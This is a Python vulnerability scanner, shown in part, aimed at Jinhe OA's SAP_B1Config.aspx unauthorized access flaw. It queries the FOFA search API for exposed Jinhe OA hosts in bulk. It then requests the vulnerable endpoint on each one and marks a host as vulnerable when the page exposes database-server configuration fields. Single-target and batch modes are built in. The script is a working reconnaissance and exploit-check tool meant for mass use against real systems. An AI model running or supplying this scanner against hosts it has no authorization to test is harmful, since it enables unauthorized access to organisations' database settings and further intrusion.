...
def Target_collection(filename): # 目标收集
    urls = [
        "https://fofa.info/api/v1/search/all?email=xxxxxx&key=xxxxxx&qbase64=YXBwPSLph5HlkoznvZHnu5wt6YeR5ZKMT0Ei&size=9999" # app="金和网络-金和OA"
        # 自行配置fofa邮箱和api key
    ]
...
def Single_objective_testing(url): # 单目标检测
    url = url + "/C6/JHsoft.CostEAI/SAP_B1Config.aspx/?manage=1"
    header = {
        "User-Agent": UA()
    }
    # print(url)
    try:
        ...
        # print(rqg.text)
        if rqg.status_code == 200 and "txtDatabaseServer" in rqg.text:
            msg = "{} 存在漏洞".format(url)
            return True, msg
        else:
...
def main():
    parser = argparse.ArgumentParser(description="### Jinhe OA SAP_ B1Config.aspx has an unauthorized access vulnerability. ###")

    parser.add_argument("-t", "--target_collection", action="store_true", help="Perform target collection")
    parser.add_argument("-r", "--multi_objective_testing", metavar="FILE", help="Perform multi-objective testing. e.g:python Jinhe_OA_SAP_B1Config_unauthorized.py -r ./url.txt")
    parser.add_argument("-u", "--single_objective_testing", metavar="URL", help="Perform single-objective testing. e.g:python Jinhe_OA_SAP_B1Config_unauthorized.py -u http://xxx.xxx.xxx")
